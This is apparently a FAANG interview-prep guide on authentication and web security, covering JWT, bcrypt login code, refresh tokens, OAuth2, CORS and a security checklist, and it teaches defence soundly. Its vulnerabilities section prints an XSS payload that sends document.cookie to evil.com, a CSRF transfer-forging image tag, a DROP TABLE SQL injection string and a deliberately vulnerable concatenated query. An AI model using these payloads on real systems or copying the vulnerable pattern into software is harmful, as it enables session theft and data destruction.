# 05 — Authentication & Security (FAANG Interview Guide)

## 🎯 What They Ask
- How does JWT authentication work? What's inside a JWT?
- Sessions vs Tokens — when to use which?
- Explain OAuth2 flow (Google/GitHub login).
- How do you store passwords securely?
- What is XSS, CSRF, SQL Injection? How to prevent each?
- What is CORS and why does it exist?
- How do you implement role-based access control (RBAC)?

---

## 1. JWT (JSON Web Token)

### Theory — What's Inside a JWT?

```
Header.Payload.Signature

eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiJ9.signature
       │                        │                        │
       ▼                        ▼                        ▼
┌──────────────┐  ┌─────────────────────┐  ┌──────────────────────┐
│   HEADER     │  │      PAYLOAD        │  │     SIGNATURE        │
│ {            │  │ {                   │  │ HMACSHA256(          │
│  "alg":"HS256"│  │  "userId": 1,      │  │   base64(header) +   │
│  "typ":"JWT" │  │  "role": "admin",   │  │   base64(payload),   │
│ }            │  │  "exp": 1700000000  │  │   secret_key         │
└──────────────┘  │ }                   │  │ )                    │
  (base64url)     └─────────────────────┘  └──────────────────────┘
                    (base64url, NOT          (verifies integrity)
                     encrypted!)
```

**⚠️ Key point:** Payload is **NOT encrypted** — anyone can decode it. The signature only prevents **tampering**. Never put sensitive data (passwords, credit cards) in the payload.

### Auth Flow

```
CLIENT                              SERVER
  │                                    │
  │  POST /login {email, password}     │
  │ ──────────────────────────────────→│
  │                                    │ Verify credentials
  │                                    │ Generate JWT
  │          { token: "eyJ..." }       │
  │ ←──────────────────────────────────│
  │                                    │
  │  GET /api/profile                  │
  │  Header: Authorization: Bearer eyJ.│
  │ ──────────────────────────────────→│
  │                                    │ Verify JWT signature
  │                                    │ Check expiry
  │          { user data }             │ Extract userId from payload
  │ ←──────────────────────────────────│
```

### 💻 Complete Auth Implementation

```javascript
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');

const JWT_SECRET = process.env.JWT_SECRET; // Keep in env, never hardcode!
const JWT_EXPIRE = '7d';

// ─── REGISTER ───
app.post('/api/auth/register', async (req, res) => {
  const { name, email, password } = req.body;

  // 1. Check if user exists
  const existing = await User.findOne({ email });
  if (existing) return res.status(409).json({ error: "Email already registered" });

  // 2. Hash password (NEVER store plain text!)
  const salt = await bcrypt.genSalt(10);       // 10 rounds
  const hashedPassword = await bcrypt.hash(password, salt);

  // 3. Create user
  const user = await User.create({ name, email, password: hashedPassword });

  // 4. Generate token
  const token = jwt.sign(
    { userId: user._id, role: user.role },   // payload
    JWT_SECRET,                               // secret
    { expiresIn: JWT_EXPIRE }                 // options
  );

  res.status(201).json({ token, user: { id: user._id, name, email } });
});

// ─── LOGIN ───
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;

  // 1. Find user
  const user = await User.findOne({ email });
  if (!user) return res.status(401).json({ error: "Invalid credentials" });

  // 2. Compare password
  const isMatch = await bcrypt.compare(password, user.password);
  if (!isMatch) return res.status(401).json({ error: "Invalid credentials" });
  // ↑ Same error message for both! Don't reveal "user not found" vs "wrong password"

  // 3. Generate token
  const token = jwt.sign({ userId: user._id, role: user.role }, JWT_SECRET, {
    expiresIn: JWT_EXPIRE
  });

  res.json({ token });
});

// ─── AUTH MIDDLEWARE ───
function authenticate(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader?.startsWith('Bearer '))
    return res.status(401).json({ error: "No token provided" });

  const token = authHeader.split(' ')[1];
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;  // { userId, role }
    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError')
      return res.status(401).json({ error: "Token expired" });
    return res.status(403).json({ error: "Invalid token" });
  }
}

// ─── ROLE-BASED ACCESS ───
function authorize(...roles) {
  return (req, res, next) => {
    if (!roles.includes(req.user.role))
      return res.status(403).json({ error: "Insufficient permissions" });
    next();
  };
}

// Usage
app.get('/api/profile', authenticate, (req, res) => { /*...*/ });
app.delete('/api/users/:id', authenticate, authorize('admin'), (req, res) => { /*...*/ });
```

---

## 2. Sessions vs Tokens

```
┌──────────────────┬──────────────────────────────────┐
│    SESSIONS      │         TOKENS (JWT)             │
├──────────────────┼──────────────────────────────────┤
│ State stored on  │ Stateless — token has all info   │
│ server (memory/  │ Server just verifies signature   │
│ Redis/DB)        │                                  │
├──────────────────┼──────────────────────────────────┤
│ Session ID in    │ Token in Authorization header    │
│ cookie           │ or localStorage                  │
├──────────────────┼──────────────────────────────────┤
│ Easy to revoke   │ Hard to revoke (until expiry)    │
│ (delete from     │ Need blacklist/short expiry +    │
│ store)           │ refresh tokens                   │
├──────────────────┼──────────────────────────────────┤
│ USE WHEN:        │ USE WHEN:                        │
│ • Server-rendered│ • SPAs, mobile apps              │
│ • Need instant   │ • Microservices (each service    │
│   revocation     │   verifies independently)        │
│ • Single server  │ • Multi-server / distributed     │
└──────────────────┴──────────────────────────────────┘
```

---

## 3. Refresh Tokens

```
CLIENT                                SERVER
  │                                      │
  │  Login → gets accessToken (15min)    │
  │          + refreshToken (7 days)     │
  │ ←────────────────────────────────────│
  │                                      │
  │  API call with accessToken           │
  │ ────────────────────────────────────→│ ✅ Valid
  │                                      │
  │  ... 15 min later, accessToken       │
  │  expired...                          │
  │ ────────────────────────────────────→│ ❌ 401 Token expired
  │                                      │
  │  POST /auth/refresh                  │
  │  { refreshToken }                    │
  │ ────────────────────────────────────→│ Verify refresh token
  │                                      │ Issue NEW access token
  │  { newAccessToken }                  │
  │ ←────────────────────────────────────│
```

```javascript
// Refresh token endpoint
app.post('/api/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  if (!refreshToken) return res.status(401).json({ error: "No refresh token" });

  try {
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_SECRET);

    // Check if refresh token is in database (not revoked)
    const stored = await RefreshToken.findOne({ token: refreshToken, userId: decoded.userId });
    if (!stored) return res.status(403).json({ error: "Token revoked" });

    // Issue new access token
    const accessToken = jwt.sign(
      { userId: decoded.userId, role: decoded.role },
      JWT_SECRET,
      { expiresIn: '15m' }
    );

    res.json({ accessToken });
  } catch (err) {
    res.status(403).json({ error: "Invalid refresh token" });
  }
});
```

---

## 4. OAuth2 Flow (Google Login)

```
USER          YOUR APP             GOOGLE
 │                │                   │
 │ Click "Login   │                   │
 │ with Google"   │                   │
 │ ──────────────→│                   │
 │                │  Redirect to      │
 │                │  Google auth URL  │
 │ ←──────────────│                   │
 │                                    │
 │  User logs in + grants permission  │
 │ ──────────────────────────────────→│
 │                                    │
 │  Redirect back with AUTH CODE      │
 │ ←──────────────────────────────────│
 │ ──────────────→│                   │
 │                │  Exchange code    │
 │                │  for tokens       │
 │                │ ─────────────────→│
 │                │                   │ Returns access_token
 │                │ ←─────────────────│   + user info
 │                │                   │
 │                │ Create/find user  │
 │                │ Issue your JWT    │
 │  { your JWT }  │                   │
 │ ←──────────────│                   │
```

---

## 5. Security Vulnerabilities

### XSS (Cross-Site Scripting)

```
ATTACK: Attacker injects malicious script into your page
  <input value="<script>fetch('evil.com?cookie='+document.cookie)</script>">

PREVENTION:
  ✅ Sanitize/escape all user input before rendering
  ✅ Use Content-Security-Policy header
  ✅ Use httpOnly cookies (JS can't access them)
  ✅ Use frameworks that auto-escape (React, Vue)
```

### CSRF (Cross-Site Request Forgery)

```
ATTACK: Trick logged-in user into making unwanted request
  User is logged into bank.com
  Attacker's site has: <img src="bank.com/transfer?to=attacker&amount=10000">
  Browser sends bank.com cookies automatically!

PREVENTION:
  ✅ CSRF tokens (server generates, client sends back)
  ✅ SameSite cookie attribute
  ✅ Check Origin/Referer headers
```

### SQL Injection

```
ATTACK: User input modifies SQL query
  Input: ' OR '1'='1'; DROP TABLE users; --
  Query: SELECT * FROM users WHERE name = '' OR '1'='1'; DROP TABLE users; --'

PREVENTION:
  ✅ ALWAYS use parameterized queries / prepared statements
  ✅ NEVER concatenate user input into SQL strings
```

```javascript
// ❌ VULNERABLE
const query = `SELECT * FROM users WHERE email = '${req.body.email}'`;

// ✅ SAFE (parameterized)
const { rows } = await pool.query('SELECT * FROM users WHERE email = $1', [req.body.email]);
```

---

## 6. CORS (Cross-Origin Resource Sharing)

```
Frontend: http://localhost:3000
Backend:  http://localhost:5000
                    ↑ Different origin (different port)!

Browser blocks cross-origin requests by default.
CORS headers tell the browser: "It's OK, I trust this origin."
```

```javascript
const cors = require('cors');

// Allow specific origins
app.use(cors({
  origin: ['http://localhost:3000', 'https://myapp.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  credentials: true,  // allow cookies
}));
```

---

## 7. Security Checklist (Production)

```javascript
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const mongoSanitize = require('express-mongo-sanitize');

app.use(helmet());                // Security headers (XSS protection, HSTS, etc.)
app.use(mongoSanitize());         // Prevent NoSQL injection
app.use(express.json({ limit: '10kb' }));  // Limit body size

// Rate limiting
app.use('/api/auth/', rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,  // 10 login attempts per 15 min
}));
```

---

## ⚡ Quick Revision

| Concept | One-liner |
|---------|-----------|
| JWT | Base64(header).Base64(payload).signature — NOT encrypted, just signed |
| bcrypt | Hash + salt passwords; compare() for login; 10-12 salt rounds |
| Access token | Short-lived (15min); sent in Authorization header |
| Refresh token | Long-lived (7d); stored securely; used to get new access tokens |
| OAuth2 | Redirect → auth server → auth code → exchange for tokens |
| XSS | Injecting scripts; prevent with escaping + CSP + httpOnly cookies |
| CSRF | Forged requests using victim's cookies; prevent with CSRF tokens |
| SQL Injection | Manipulating queries; prevent with parameterized queries |
| CORS | Browser security; server sends headers to allow cross-origin requests |
| 401 vs 403 | 401 = not authenticated; 403 = authenticated but forbidden |
